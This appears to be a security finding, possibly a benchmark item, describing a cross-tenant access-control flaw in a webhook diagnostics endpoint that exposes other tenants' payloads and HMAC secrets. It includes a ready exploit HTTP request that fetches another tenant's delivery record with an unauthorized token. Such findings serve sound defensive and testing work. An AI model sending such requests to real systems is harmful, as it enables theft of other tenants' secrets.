diagnosis: The webhook diagnostics endpoint inspects dispatch messages captured from diagnostics_channel using req.params.deliveryId without validating tenant membership. Any tenant user can retrieve webhook payloads, target API endpoints, and shared HMAC secrets used by other tenants, compromising the integrity of external webhook integrations.
exploit_request:
GET /admin/diagnostics/webhooks/wh_dlv_corp_stripe_9921 HTTP/1.1
Host: webhooks.platform.internal:7077
Authorization: Bearer <unauthorized_tenant_jwt>
Accept: application/json
